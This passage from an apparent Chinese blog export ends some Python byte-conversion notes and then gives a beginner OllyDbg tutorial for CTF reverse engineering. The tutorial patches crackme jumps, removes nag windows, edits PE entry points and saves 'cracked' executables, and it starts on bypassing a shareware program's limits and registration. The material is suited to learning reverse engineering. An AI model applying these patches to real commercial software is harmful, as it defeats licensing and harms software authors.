进制之间不能跳过十进制互相转换\t\n# print(bin(oct(11111),8))\nprint(bin(11111))\t\t\t\t# 0b10101101100111\nprint(int(bin(11111),2))\t\t# 11111\n```\n\n## 22.2 字符串转整数\n\n```python\nprint(int('23333'))\t\t\t\t# 23333\nprint(int('23333',16))\t\t\t# 144179\nprint(int('0x23333',16))\t\t# 144179\nprint(int('23333',8))\t\t\t# 9947\n```\n\n## 22.3 整数与字节串之间的转换\n\n```python\n# 字节串转整数\n# 大端法\nprint(int.from_bytes(b'y\\xcc\\xa6\\xbb',byteorder='big'))\t# 2043455163\n\n# 小端法\nprint(int.from_bytes(b'y\\xcc\\xa6\\xbb',byteorder='little'))\t# 3148270713\n\n# 导入struct包\nimport struct\n# 默认转化成元组形式，但只可以包含一个元素\nprint(struct.unpack('>L',b'y\\xcc\\xa6\\xbb'))\t# (2043455163,)\n\n# 取元组下标为0的元素\nprint(struct.unpack('>L',b'y\\xcc\\xa6\\xbb')[0])\t# 2043455163\n\n# 整数转字节串\n# 后面有几个整数就要写多少个格式化字符\nprint(struct.pack('>L',3148270713))\t# b'\\xbb\\xa6\\xccy'\nprint(struct.pack('<LLL',1,2,3))\t# b'\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x03\\x00\\x00\\x00'\n```\n\n关于struct包pack和unpack的第一个参数：\n\n{% asset_img struct包.png 特点 %}\n\n{% asset_img struct包2.png 格式 %}\n\n## 22.4 字符串与字节串之间的转换\n\n```python\n# 字符串转字节串\n# 字符串编码为字节码\nprint('v5le0n9'.encode('ascii'))\t# b'v5le0n9'\n\n# 如果有中文用utf-8编码\nprint('v5le0n9哈'.encode('utf-8'))\t# b'v5le0n9\\xe5\\x93\\x88'\n\n# 数字或字符数组编码成字节码\nprint(bytes(1)) \t# b'\\x00'\n# print(bytes(1,2,3))   # 当多个整型转换要先转化为数组\nprint(bytes([1,0xb,ord('3')]))\t# b'\\x01\\x0b3'\n\n# 16进制字符串转字节串\nprint(bytes().fromhex('abcd45')) \t# b'\\xab\\xcdE'\n\n# map(func,iterable)第一个参数表示函数，第二参数表示一个或多个序列\n# 将后面序列都调用前面的函数，最后返回一个迭代器\n# 将这个迭代器里的内容转化为字节串\nprint(bytes(map(ord,'\\x01\\x02\\x31\\x32\\x97\\x98')))\t# b'\\x01\\x0212\\x97\\x98'\n\n# 字节串转字符串\n# 字节码解码为字符串\nprint(bytes(b'v5le0n9\\xe5\\x93\\x88').decode('utf-8'))\t# v5le0n9哈\n\n# 将里面的内容先转为字节串，再转化为字符串，截取下标为2到-1的字符串\nprint(str(bytes(b'\\x01\\x0212'))[2:-1])\t# \\x01\\x0212\n\n# 字节串转16进制，再转字符串，截取下标为2到-1的字符串\nimport binascii\nprint(str(binascii.b2a_hex(b'\\x01\\x0212'))[2:-1])\t# 01023132\n\n# 字节串转16进制，再以字符串的形式插入列表\nprint([hex(x) for x in bytes(b'\\x01\\x0212')])\t# ['0x1', '0x2', '0x31', '0x32']\n```\n\n","categories":["开发"],"tags":["Python"]},{"title":"调试器使用教程","url":"/posts/33a085c7.html","content":"做CTF的逆向题时苦于对大佬们的wp各种看不懂，只因自己太菜跟不上大佬的节奏，所以才写了这一篇最最最基础的，保姆级的，手把手教的，看完包会的调试器使用教程。其中重点讲OllyDbg，参考看雪的书《加密与解密》，参考小甲鱼的视频《OD使用教程》做的笔记，其次做了一些x64dbg与OD有区别的笔记。希望这篇文章不仅能帮助你们看懂大佬们的wp，而且可以自己实现逆向破解，一起加油吧！\n\n<!--more-->\n\n# 一、OllyDbg\n\n## 1. OD界面\n\n{% asset_img OD界面.png OD界面 %}\n\n1. 汇编代码对应的地址窗口：存放虚拟地址，一般情况下同一程序的同一条指令在不同系统环境下此值相同\n2. 汇编代码对应的十六进制机器码窗口\n3. 反汇编窗口\n\n4. 反汇编代码对应的注释信息窗口\n\n5. 寄存器信息窗口(32位4个字节00000000-FFFFFFFF)\n   - EAX扩展累加寄存器\n   - EBX扩展基址寄存器\n   - ECX扩展计数寄存器\n   - EDX扩展数据寄存器\n   - ESI扩展来源寄存器\n   - EDI扩展目标寄存器\n   - EBP扩展基址指针寄存器：主要用于栈和栈桢\n   - ESP扩展堆栈指针寄存器：指向当前进程的栈空间地址\n   - EIP扩展指令指针寄存器：指向下一条要被执行的指令\n\n6. 当前执行到反汇编代码的信息窗口\n\n7. ~9. 数据所在的内存地址，十六进制，ASCII码\n\n10. ~12. 栈地址，存放的数据，对应说明信息\n\n## 2. OD常用的快捷键\n\n| 快捷键   | 功能                                                         |\n| -------- | ------------------------------------------------------------ |\n| F2       | 下断点，也就是指定断点的地址                                 |\n| Alt+B    | 打开断点管理                                                 |\n| 空格     | 快速切换断点状态(开启/禁止)                                  |\n| F3       | 加载一个可执行程序，进行调试分析                             |\n| F4       | 程序执行到光标处                                             |\n| F5       | 缩小、还原当前窗口                                           |\n| F7       | 单步步入                                                     |\n| F8       | 单步步过                                                     |\n| Ctrl+F8  | 自动单步步过                                                 |\n| F9       | 直接运行程序，遇到断点处，程序暂停                           |\n| Ctrl+F2  | 重新运行程序到起始处，一般用于重新调试程序                   |\n| Ctrl+F9  | 执行到函数返回处，用于跳出函数实现                           |\n| Shift+F9 | 与F9相同，但是如果被调试程序发生异常而中止，调试器会首先尝试执行被调试程序指定的异常处理 |\n| Alt+F9   | 执行到用户代码处，用于快速跳出函数系统                       |\n| Ctrl+G   | 输入十六进制地址，快速定位到该地址处                         |\n| ；       | 添加注释                                                     |\n\n## 3. 实验一 改变内容\n\n{% asset_img 实验1.png 实验1 %}\n\n目标：将标题改为“v5le0n9”，内容改为“这是我修改的第一个程序”\n\nF3加载程序进OD，F8单步步过，在弹出弹窗的地址F2下断点。Ctrl+F2重新加载程序，F9到达断点处，F7单步步入，F8单步步过，在弹出弹窗的地址按F2下断点，Alt+B查看所有断点，将光标放置在要取消断点的元组，按空格取消。重复以上，直到在注释窗口看到弹窗的内容。\n\n{% asset_img 实验1.1.png 实验1.1 %}\n\n从汇编角度看，“hello”被压入了00937b30地址，“这是我写的第一个程序”被压入了00937b68地址。\n\n在数据窗口按Ctrl+G快速定位到00937b30\n\n{% asset_img 实验1.2.png 实验1.2 %}\n\n双击00937b30的第一个十六进制68，取消keep size，在unicode框中直接修改为v5le0n9（如果原内容用Unicode就用Unicode，ASCII就用ASCII），如果后面没有00要在末尾加上00，因为字符串默认以00结尾。我们这里有很多个00，所以不用管它。\n\n{% asset_img 实验1.3.png 实验1.3 %}\n\n接下来修改内容，Ctrl+G定位到00937b68，发现直接在Unicode改中文不可行，那只能改下面的16进制表示。将我们要输入的字符串改为16进制。\n\n{% asset_img 实验1.4.png 实验1.4 %}\n\n由于PE结构用的是小端存储，所以8fd9要写成d98f表示“这”，以此类推。\n\n{% asset_img 实验1.5.png 实验1.5 %}\n\n再按F9，由于后面没有断点直接运行到程序结束，程序成功修改。\n\n{% asset_img 实验1.6.png 实验1.6 %}\n\n选中我们在数据窗口所有修改过的痕迹，右键->copy to executable file，会弹出一个窗口，图标为D，在窗口内右键->backup->save data to file，另存为exe文件，这就是“破解版”。双击新的exe直接显示我们修改好的内容。\n\n## 4. 容易犯错的调试方法\n\n一路F8，碰到问题下断点，直到把问题解决。就是我们实验一的做法，但在实验一是可行的，因为它不需要用户输入任何东西。如果需要用户输入，实验一的调试会陷入死循环，因为用户没有接触到窗口，它一直在等用户发过来的消息。\n\n{% asset_img 死循环的原因.jpg 死循环的原因 %}\n\n### 4.1 正确的破解方式\n\nWindows程序是以API函数为基础的程序，所有程序都要调用API函数。\n\n程序读取文本框内容的字符串通常用的是以下两个函数：\n\n```\nCtrl+G跟踪表达式\nGetDlgItemTextA(GetDlgItemTextW)\nGetWindowTextA(GetWindowTextW)\n```\n\n汇编代码的返回值约定是存放在eax里面的，如果32位的eax不够存放返回值，系统会将返回值放在内存某个位置并把该位置的地址放在eax返回。\n\n## 5. 实验二 TraceMe\n\n{% asset_img 实验2.png 实验2 %}\n\n目标：无论输入什么都成功。\n\n在IDA查看一下源代码\n\n```c\nint __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)\n{\n  ::hInstance = hInstance;\n  DialogBoxParamA(hInstance, (LPCSTR)0x65, 0, DialogFunc, 0);\n  return 0;\n}\n\nBOOL __stdcall DialogFunc(HWND hWnd, UINT a2, WPARAM a3, LPARAM a4)\n{\n  int v5; // ebx\n  HWND v6; // eax\n  HWND v7; // eax\n  HWND v8; // eax\n  HICON v9; // eax\n  CHAR String2[4]; // [esp+8h] [ebp-F4h]\n  int v11; // [esp+Ch] [ebp-F0h]\n  int v12; // [esp+10h] [ebp-ECh]\n  __int16 v13; // [esp+14h] [ebp-E8h]\n  char v14; // [esp+16h] [ebp-E6h]\n  CHAR v15; // [esp+18h] [ebp-E4h]\n  char v16; // [esp+2Eh] [ebp-CEh]\n  CHAR v17; // [esp+30h] [ebp-CCh]\n  __int16 v18; // [esp+44h] [ebp-B8h]\n  char v19; // [esp+46h] [ebp-B6h]\n  CHAR String; // [esp+48h] [ebp-B4h]\n  CHAR String1; // [esp+98h] [ebp-64h]\n\n  qmemcpy(&v15, byte_405060, 0x16u);\n  v11 = dword_405054;\n  v16 = byte_405060[22];\n  v14 = byte_40505E;\n  qmemcpy(&v17, &unk_405038, 0x14u);\n  *(_DWORD *)String2 = dword_405050;\n  v18 = *((_WORD *)&unk_405038 + 10);\n  v13 = word_40505C;\n  v12 = dword_405058;\n  v19 = *((_BYTE *)&unk_405038 + 22);\n  if ( a2 == 16 )\n  {\n    DestroyWindow(hWnd);\n    return 1;\n  }\n  if ( a2 == 272 )\n  {\n    v9 = LoadIconA(hInstance, (LPCSTR)0x70);\n    SendMessageA(hWnd, 0x80u, 1u, (LPARAM)v9);\n    SendDlgItemMessageA(hWnd, 110, 0xC5u, 0x50u, 0);\n    return 1;\n  }\n  if ( a2 != 273 )\n    return 0;\n  if ( (signed int)(unsigned __int16)a3 > 1013 )\n  {\n    if ( (unsigned __int16)a3 == 1014 || (unsigned __int16)a3 == 40002 )\n      DialogBoxParamA(hInstance, (LPCSTR)0x67, hWnd, sub_401020, 0);\n    return 0;\n  }\n  if ( (unsigned __int16)a3 != 1013 )\n  {\n    if ( (unsigned __int16)a3 == 2 || (unsigned __int16)a3 == 1002 )\n    {\n      SendMessageA(hWnd, 0x10u, 0, 0);\n      return 0;\n    }\n    return 0;\n  }\n  v5 = GetDlgItemTextA(hWnd, 110, &String, 81);\n  GetDlgItemTextA(hWnd, 1000, &String1, 101);\n  if ( String && v5 >= 5 )\n  {\n    if ( sub_401340(&String1, &String, v5) )\n    {\n      lstrcpyA(::String1, String2);\n      v6 = GetDlgItem(hWnd, 110);\n      EnableWindow(v6, 0);\n      v7 = GetDlgItem(hWnd, 1000);\n      EnableWindow(v7, 0);\n      v8 = GetDlgItem(hWnd, 1000);\n    }\n    else\n    {\n      lstrcpyA(::String1, &v17);\n      v8 = GetDlgItem(hWnd, 1000);\n    }\n  }\n  else\n  {\n    lstrcpyA(::String1, &v15);\n    v8 = GetDlgItem(hWnd, 110);\n  }\n  SetFocus(v8);\n  MessageBeep(0);\n  DialogBoxParamA(hInstance, (LPCSTR)0x79, hWnd, sub_401060, 0);\n  return 0;\n}\n```\n\n可知程序用的是`GetDlgItemTextA`函数，Ctrl+G查找函数，F2下断点。按F9，会弹出输入框，输入后一路F8，直到看到我们刚才输入的内容，再仔细分析接下来的汇编。\n\n```asm\n004011D7      .  8D5424 4C     lea edx,dword ptr ss:[esp+0x4C];v5le0n9\n004011DB      .  53            push ebx;ebx=7,用户名长度\n004011DC      .  8D8424 A00000>lea eax,dword ptr ss:[esp+0xA0];l30n9ry0n\n004011E3      .  52            push edx;将用户名push进去\n004011E4      .  50            push eax;将序列号push进去\n004011E5      .  E8 56010000   call TraceMe.00401340;验证用户名和序列号的函数\n004011EA      .  8B3D BC404000 mov edi,dword ptr ds:[<&USER32.GetDlgIte>;  user32.GetDlgItem\n004011F0      .  83C4 0C       add esp,0xC\n004011F3      .  85C0          test eax,eax;TraceMe.00401340函数的返回值\n004011F5      . /74 37         je short TraceMe.0040122E;跳转\n```\n\n因为我们现在是暴力破解，所以可以不用进验证函数查看具体验证操作，直接改函数的返回值即可。在`test eax,eax`执行完后，也就是在`je short TraceMe.0040122E`指令将寄存器中Z标志位改变。F9走到程序结束，弹窗成功了。\n\n{% asset_img 实验2.1.png 实验2.1 %}\n\n如果想保存破解版的话，直接改标志位是不可行的。另一种方法是将`je short TraceMe.0040122E`改为`nop`或改为`jne short TraceMe.0040122E`，右键->保存到可执行文件->选择，在D图标中右键->备份->保存数据到文件。破解版无论输入什么都是成功的。\n\n## 6. 加载目标文件调试\n\n设置OD中断在程序的入口点：Options->Debugging options->Events\n\n```\nsystem breakpoint \t\t\t系统断点(int 13)\nentry point of main module \t主模块的入口点，即文件的入口点\nwinmain \t\t\t\t\t程序的WinMain()函数入口点\n```\n\n### 6.1 call指令\n\n`call xxx`等同于`push eip;jmp xxx`\n\n```\ncall 404000h\t\t\t直接跳到函数或过程的地址\ncall eax\t\t\t\t函数或过程地址存放在eax\ncall dword ptr [eax]\ncall dword ptr [eax+5]\ncall dword ptr [<&API>]\t执行一个系统API:系统提供给我们的接口\n```\n\n### 6.2 mov指令\n\nmov指令格式：mov dest, src\n\n> 将src的内容拷贝到dest\n\n#### 6.2.1 **mov扩展**\n\nmovs/movsb/movsw/movsd edi, esi：按串/字节/字/双字节为单位将esi寄存器指向的数据复制到edi寄存器指向的空间。\n\nmovsx：符号位扩展，byte->word, word->dword(扩展后高位全用符号位填充)，然后实现mov。\n\n```asm\nMOV BL,80H\nMOVSX AX,BL\n运行完以上汇编语句之后，AX的值为FF80H。由于BL为80H=1000 0000，最高位也即符号位为1，在进行带符号扩展时，其扩展的高8位均为1，故赋值AX为1111 1111 1000 0000，即AX=FF80H。\n```\n\nmovzx：零扩展，byte->word, word->dword(扩展后高位全用0填充)，然后实现mov。\n\n### 6.3 cmp指令\n\ncmp指令格式：cmp dest, src\n\n> 比较两个操作数，并通过比较结果设置C/O/Z标志位\n\n```\ncmp eax, ebx\t\t相等Z标志位置1，否则置0\ncmp eax, [404000]\t取404000h地址的dword型数据与eax相比较\ncmp [404000], eax\n```\n\nZ标志位：Zero 零标志位 运算结果为0时置1，否则置0\n\nO标志位：Overflow 溢出标志位 溢出置1，否则置0\n\nC标志位：Carry flag 进位标志位 进位置1，否则置0\n\n### 6.4 test指令\n\ntest指令格式：test dest, src\n\n> 和and指令一样，对两个操作数进行按位与运算，但test指令不将结果保存到test中，仅对标志位重新置位\n\n```\ntest eax, eax\t\t如果eax为的值0，则Z标志位置1\n```\n\neax存放所有函数的返回值。\n\n### 6.5 条件跳转指令\n\n想让它跳转就设置无条件跳转jmp指令\n\n不想让它跳转设置nop指令\n\n调试的时候注重跳转指令和cmp指令还有test指令。\n\n破解版(免注册机)：全选修改过的程序右键->复制到可执行文件->选择，会生成一个文件，文件右键->备份->保存数据到文件。\n\n跳过指令的方法：\n\n1. 改为无条件跳转指令jmp\n2. 将需要跳过的地方全用nop填充(右键->二进制->用NOP填充)\n\n### 6.6 patch(补丁)\n\nOD可用`/`(有的OD是`P`)查看修改的内容\n\n## 7. 实验三 ReverseMe\n\n{% asset_img 实验3.png 实验3 %}\n\n目标：让它绕过过期指令。\n\nF3加载进OD，可以看到这个程序很小，汇编代码量不多。右键->中文搜索引擎->智能搜索，查看字符串。\n\n```asm\n中文搜索引擎\n地址       反汇编                               文本字符串\n00401000   push 0x0                            (Initial CPU selection)\n0040106E   push reverseM.00402079              Keyfile.dat\n0040107F   push reverseM.00402000              Key File ReverseMe\n00401084   push reverseM.00402017              Evaluation period out of date.Purchase new license\n004010F9   push reverseM.00402000              Key File ReverseMe\n004010FE   push reverseM.00402086              Keyfile is not valid. Sorry.\n00401207   push reverseM.00402000              Key File ReverseMe\n0040120C   push reverseM.004020DE              You really did it! Congratz !!!\n```\n\n再结合注释窗口，我们可以知道，`Keyfile.dat`是存储许可证的地方，有三个`MessageBox`，但运行程序只会弹出一个，可能是if语句。我们现在要让它弹出`You really did it! Congratz !!!`。\n\n因为这个程序很小，从头开始就可以认真看汇编，关键是跳转指令，千万不要让它跳转到其它弹窗。\n\n```asm\njnz short 0040109A\t\t=>\tjz short 0040109A或jmp short 0040109A\njnz short 004010B4\t\t=>\tjz short 004010B4或jmp short 004010B4\njl short 004010F7\t\t=>\tjnl short 004010F7或nop\njl short 004010F7\t\t=>\tjnl short 004010F7或nop\n```\n\n{% asset_img 实验3.1.png 实验3.1 %}\n\n将修改过的痕迹全选，按照上次实验1，2保存破解版。\n\n还可以做一个补丁版，这个程序的补丁就是要将`Keyfile.dat`中的许可证变为有效的，需要仔细分析程序汇编代码，要很强的阅读汇编代码的能力。(在OD的`/`图标可查看所有打过的补丁。)\n\n修改第一个让它进入`Readfile`\n\n```asm\njnz short 0040109A\t\t=>\tjz short 0040109A或jmp short 0040109A\n```\n\n修改第二个避免让它跳出`Readfile`\n\n```asm\njnz short 004010B4\t\t=>\tjz short 004010B4或jmp short 004010B4\n```\n\n下面是`Readfile`函数实现：\n\n```asm\n0040109A   > \\6A 00         push 0x0                                 ; /pOverlapped = NULL\n0040109C   .  68 73214000   push reverseM.00402173                   ; |pBytesRead = reverseM.00402173\n004010A1   .  6A 46         push 0x46                                ; |BytesToRead = 46 (70.)\n004010A3   .  68 1A214000   push reverseM.0040211A                   ; |Buffer = reverseM.0040211A\n004010A8   .  50            push eax                                 ; |hFile = NULL\n004010A9   .  E8 2F020000   call <jmp.&KERNEL32.ReadFile>            ; \\ReadFile\n004010AE   .  85C0          test eax,eax\n004010B0      74 02         je short reverseM.004010B4\n004010B2   .  EB 43         jmp short reverseM.004010F7\n004010B4   > \\33DB          xor ebx,ebx;ebx=0\n004010B6   .  33F6          xor esi,esi;esi=0                        ;  reverseM.<ModuleEntryPoint>\n004010B8   .  833D 73214000>cmp dword ptr ds:[0x402173],0x10;ds:[0402173]要16个byte\n004010BF      7C 36         jl short reverseM.004010F7;否则跳出函数\n004010C1   >  8A83 1A214000 mov al,byte ptr ds:[ebx+0x40211A];将Buffer[0]的内容赋值到al,第二次将Buffer[1]的内容赋值到al...\n004010C7   .  3C 00         cmp al,0x0;比较al是否为0\n004010C9   .  74 08         je short reverseM.004010D3;是的话就跳转实现，到D3位置\n004010CB   .  3C 47         cmp al,0x47;比较al是否是大写字母G\n004010CD   .  75 01         jnz short reverseM.004010D0;不是的话就跳出函数\n004010CF   .  46            inc esi;esi+=1                             ;  reverseM.<ModuleEntryPoint>\n004010D0   >  43            inc ebx;ebx+=1\n004010D1   .^ EB EE         jmp short reverseM.004010C1;回到C1位置，循环\n004010D3   >  83FE 08       cmp esi,0x8;比较esi是否为8，也就是循环8次\n004010D6      7C 1F         jl short reverseM.004010F7\n004010D8   .  E9 28010000   jmp reverseM.00401205\n```\n\n所以`Keyfile.dat`中，前8个是G，长度为16，后8个字符任意。\n\n在与`ReveseMe.exe`同一目录下创建一个`Keyfile.dat`文件\n\n```\nGGGGGGGGHHHHHHHH\n```\n\n有了这个dat文件后，将原文件直接跑，也是成功的。\n\n{% asset_img 实验3.2.png 实验3.2 %}\n\n## 8. 去除NAG窗口\n\nnag窗口是软件设计者用来时不时提醒用户购买正版的警告窗口。\n\n父句柄消灭，子进程也会被消灭。\n\n### 8.1 PE结构\n\nPE(PortableExecutable)：可执行文件\n\nAOE(AddressOfEntryPoint)：程序入口地址\n\nVA(VirtualAddress)：虚拟地址\n\nRVA(RelativeVirtualAddress)：相对虚拟地址\n\nEP(EntryPoint)：程序入口点\n\nPE文件中，最下面的节区(区块)是运行一个程序真正需要的内容。上面的“头”仅仅是帮助Windows加载器定位和寻找下面区块的内容。\n\nGetModuleHandle这个API函数用于获取程序的ImageBase(基址)。\n\nMessageBox的OwnerHandle为0，可以将这个值改为一个不存在的值，例如1，这样它就找不到父句柄，就不会被显示出来。\n\n## 9. 实验四 RegisterMe\n\n{% asset_img 实验4.png 实验4 %}\n\n{% asset_img 实验4.1.png 实验4.1 %}\n\n{% asset_img 实验4.2.png 实验4.2 %}\n\n目标：去除NAG窗口。\n\nOD载入程序就看到注释区有NAG窗口的字符串。看不到的话就右键->查找->所有参考文本字串，找到第一个NAG窗口。\n\n第一种方法：\n\n```asm\nje short 00401024\t\t=>\tjmp short 00401024或jne short 00401024\n```\n\n第二种方法：\n\n```asm\n00401011  |. |6A 00         push 0x0                                 ; /Style = MB_OK|MB_APPLMODAL\n00401013  |. |68 7D304000   push Register.0040307D                   ; |Title = \"Register Me\"\n00401018  |. |68 34304000   push Register.00403034                   ; |Text = \"Remove the nags to register\nThis will make program fully registered :))\"\n0040101D  |. |6A 00         push 0x0                                 ; |hOwner = NULL\n0040101F  |. |E8 C6010000   call <jmp.&USER32.MessageBoxA>           ; \\MessageBoxA\n```\n\n将MessageBoxA函数选中->右键->Binary->Fill with NOPs\n\n第三种方法：\n\n将MessageBoxA函数的父句柄改为1，因为我们没有一个父进程是1所以MessageBoxA不实现 。\n\n```asm\n0040101D  |. |6A 00         push 0x0                                 ; |hOwner = NULL\t将push 0x0\t=>\tpush 1\n```\n\n第四种方法：\n\n修改文件入口处绕过第一个NAG窗口，第二个NAG窗口再用以上三种方法解决。\n\n```asm\n00401000 >/$  6A 00         push 0x0                                 ; /pModule = NULL\n00401002  |.  E8 0D020000   call <jmp.&KERNEL32.GetModuleHandleA>    ; \\GetModuleHandleA\n00401007  |.  A3 1C314000   mov dword ptr ds:[0x40311C],eax\n0040100C  |.  83F8 00       cmp eax,0x0\n0040100F      74 13         je short Register.00401024\n00401011      6A 00         push 0x0                                 ; /Style = MB_OK|MB_APPLMODAL\n00401013      68 7D304000   push Register.0040307D                   ; |Title = \"Register Me\"\n00401018      68 34304000   push Register.00403034                   ;  ASCII \"Remove the nags to register\\r\\nThis will make program fully registered :))\"\n0040101D      6A 00         push 0x0\n0040101F      E8 C6010000   call <jmp.&USER32.MessageBoxA>           ; \\MessageBoxA\n00401024  |> \\6A 0A         push 0xA                                 ; /Arg4 = 0000000A\n00401026  |.  FF35 20314000 push dword ptr ds:[0x403120]             ; |Arg3 = 00000000\n0040102C  |.  6A 00         push 0x0                                 ; |Arg2 = 00000000\n0040102E  |.  FF35 1C314000 push dword ptr ds:[0x40311C]             ; |Arg1 = 00000000\n00401034  |.  E8 19000000   call Register.00401052                   ; \\Register.00401052\n00401039  |.  6A 00         push 0x0                                 ; /Style = MB_OK|MB_APPLMODAL\n0040103B  |.  68 7D304000   push Register.0040307D                   ; |Title = \"Register Me\"\n00401040  |.  68 89304000   push Register.00403089                   ; |Text = \"Oops! I am not registered !!\"\n00401045  |.  6A 00         push 0x0                                 ; |hOwner = NULL\n00401047  |.  E8 9E010000   call <jmp.&USER32.MessageBoxA>           ; \\MessageBoxA\n0040104C  |.  50            push eax                                 ; /ExitCode = 0x19FFCC\n0040104D  \\.  E8 BC010000   call <jmp.&KERNEL32.ExitProcess>         ; \\ExitProcess\n```\n\n程序原本的入口点在401000地址，绕过MessageBoxA，那就修改程序入口点为401024。\n\n点击图标M，M是内存分布表，找到401000地址的PE头：\n\n```asm\nMemory map, item 14\n Address=00400000\n Size=00001000 (4096.)\n Owner=Register 00400000 (itself)\n Section=\n Contains=PE header\n Type=Imag 01001002\n Access=R\n Initial access=RWE\n```\n\n双击这一行，会弹出D图标，找到“Offset to PE signature”，PE头开始的地方。\n\n```asm\nVA\t\t\t内存RVA\t\t人类易读RVA\t\t\t\t注释\n0040003C    C0000000    DD 000000C0          ; Offset to PE signature\n```\n\n再去找RVA为000000C0也就是VA为4000C0地址的地方。找到AOE，它的VA是4000E8。\n\n```asm\n004000E8     00100000    DD 00001000          ;  AddressOfEntryPoint = 0x1000\n```\n\n返回图标C的数据窗口，Ctrl+G快速定位到4000E8，存的是00 10 00 00，由于是小端序存储，我们要改成24 10 00 00，就能绕过第一个NAG窗口。\n\n选中24，即我们修改过的地方，右键->复制到可执行文件->右键->备份->复制数据到文件。如果修改第二个NAG要从半破解版程序的基础上改(因为数据窗口和反汇编窗口都要选中再复制到可执行文件我不会)。\n\n### 9.1 RegisterMe.Oops\n\n双击竟然打不开。OD运行也打不开。奇奇怪怪，是我这个程序有问题吧！！但还是可以看汇编代码的。\n\n查看PE头，也是400000-401000正常值，但是点进PE头会发现某些数值大得离谱。\n\n```asm\n004000C0    50 45 00 00>ASCII \"PE\"           ; PE signature (PE)\n004000C4    4C01        DW 014C              ; Machine = IMAGE_FILE_MACHINE_I386\n004000C6    0400        DW 0004              ;  NumberOfSections = 0x4\n004000C8    1E29D138    DD 38D1291E          ;  TimeDateStamp = 0x38D1291E\n004000CC    00000000    DD 00000000          ;  PointerToSymbolTable = 0x0\n004000D0    00000000    DD 00000000          ;  NumberOfSymbols = 0x0\n004000D4    E000        DW 00E0              ;  SizeOfOptionalHeader = E0 (224.)\n004000D6    0F01        DW 010F              ;  Characteristics = EXECUTABLE_IMAGE|32BIT_MACHINE|RELOCS_STRIPPED|LINE_NUMS_STRIPPED|LOCAL_SYMS_STRIPPED\n004000D8    0B01        DW 010B              ; MagicNumber = PE32\n004000DA    05          DB 05                ;  MajorLinkerVersion = 0x5\n004000DB    0C          DB 0C                ;  MinorLinkerVersion = C (12.)\n004000DC    00040040    DD 40000400          ;  SizeOfCode = 40000400 (1073742848.)改为400\n004000E0    000A0040    DD 40000A00          ;  SizeOfInitializedData = 40000A00 (1073744384.)改为A00\n004000E4    00000000    DD 00000000          ;  SizeOfUninitializedData = 0x0\n004000E8    00100000    DD 00001000          ;  AddressOfEntryPoint = 0x1000\n004000EC    00100040    DD 40001000          ;  BaseOfCode = 0x40001000改为1000\n004000F0    00200040    DD 40002000          ;  BaseOfData = 0x40002000改为2000\n004000F4    00004000    DD 00400000          ; ImageBase = 0x400000\n004000F8    00100000    DD 00001000          ;  SectionAlignment = 0x1000\n004000FC    00020000    DD 00000200          ;  FileAlignment = 0x200\n00400100    0400        DW 0004              ;  MajorOSVersion = 0x4\n00400102    0000        DW 0000              ;  MinorOSVersion = 0x0\n00400104    0000        DW 0000              ;  MajorImageVersion = 0x0\n00400106    0000        DW 0000              ;  MinorImageVersion = 0x0\n00400108    0400        DW 0004              ;  MajorSubsystemVersion = 0x4\n0040010A    0000        DW 0000              ;  MinorSubsystemVersion = 0x0\n0040010C    00000000    DD 00000000          ;  Reserved\n00400110    00500000    DD 00005000          ;  SizeOfImage = 5000 (20480.)\n00400114    00040000    DD 00000400          ;  SizeOfHeaders = 400 (1024.)\n00400118    99B40000    DD 0000B499          ;  CheckSum = 0xB499\n0040011C    0200        DW 0002              ;  Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI\n0040011E    0000        DW 0000              ;  DLLCharacteristics = 0x0\n00400120    00001000    DD 00100000          ;  SizeOfStackReserve = 100000 (1048576.)\n00400124    00100000    DD 00001000          ;  SizeOfStackCommit = 1000 (4096.)\n00400128    00001000    DD 00100000          ;  SizeOfHeapReserve = 100000 (1048576.)\n0040012C    00100000    DD 00001000          ;  SizeOfHeapCommit = 1000 (4096.)\n00400130    00000000    DD 00000000          ;  LoaderFlags = 0x0\n00400134    04000040    DD 40000004          ;  NumberOfRvaAndSizes = 40000004 (1073741828.)改为10\n00400138    00005000    DD 00500000          ;  Export Table address = 0x500000改为0\n0040013C    00000500    DD 00050000          ;  Export Table size = 50000 (327680.)改为0\n00400140    50200000    DD 00002050          ;  Import Table address = 0x2050\n00400144    3C000000    DD 0000003C          ;  Import Table size = 3C (60.)\n00400148    00400000    DD 00004000          ;  Resource Table address = 0x4000\n0040014C    9C030000    DD 0000039C          ;  Resource Table size = 39C (924.)\n00400150    00000000    DD 00000000          ;  Exception Table address = 0x0\n00400154    00000000    DD 00000000          ;  Exception Table size = 0x0\n```\n\n右键->modify integer修改以上数值。修改完后返回C图标的数据窗口，Ctrl+G定位到我们修改过的地方，选中保存。保存后的程序就跟RegisterMe一样了。\n\n## 10. SEH\n\n### 10.1 Windows程序异常\n\nSEH(Structured Exception Handling)：结构化异常处理\n\nSEH是Windows操作系统提供的功能，跟开发工具无关。\n\nWindows程序设计中最重要就是消息传递，事件驱动。当GUI应用程序触发一个消息时，系统将把该消息放入消息队列，然后去查找并调用窗体的消息处理函数(CALLBACK)，传递的参数就是这个消息。\n\n异常也当作一种消息，应用程序发生异常时就触发了该消息并告知系统。系统接收后同样会找它的“回调函数”，也就是我们的异常处理例程。\n\n如果在程序中没有做异常处理的话，系统也不会置之不理，它将弹出常见的应用程序错误框，然后结束该程序。\n\n在OD中，Shift+F7/F8/F9来忽略程序异常。或者在Options->Debugging options->Exceptions->Add range->00000000~FFFFFFFF(32位整个内存段)\n\n## 11. 实验五 pixtopianbook\n\n{% asset_img 实验5.png 实验5 %}\n\n{% asset_img 实验5.2.png 实验5.2 %}\n\n目标：突破每组只能有4个联系人，只能创建3个组，去除未注册信息，注册版本爆破。\n\nOD载入程序，F9运行程序，弹出界面。\n\n(如果没有弹出界面，可能是在异常处中断了。在OD中，Shift+F7/F8/F9来忽略程序异常。或者在Options->Debugging options->Exceptions->Add range->设置00000000~FFFFFFFF(32位整个内存段))\n\n**突破4个联系人**\n\n为什么不能右键->查找->所有参考文本字串？我猜可能是因为触发错误异常的弹窗文本不计入内？\n\n但可以右键->中文搜索引擎->智能搜索，查看字符串。一下子就找到了下面的汇编代码。\n\n另一种方法：\n\n已知我们准备添加第5个联系人时程序会弹窗，在Command窗口设置软断点`bp MessageBoxA`，意味着当程序执行到有 MessageBoxA 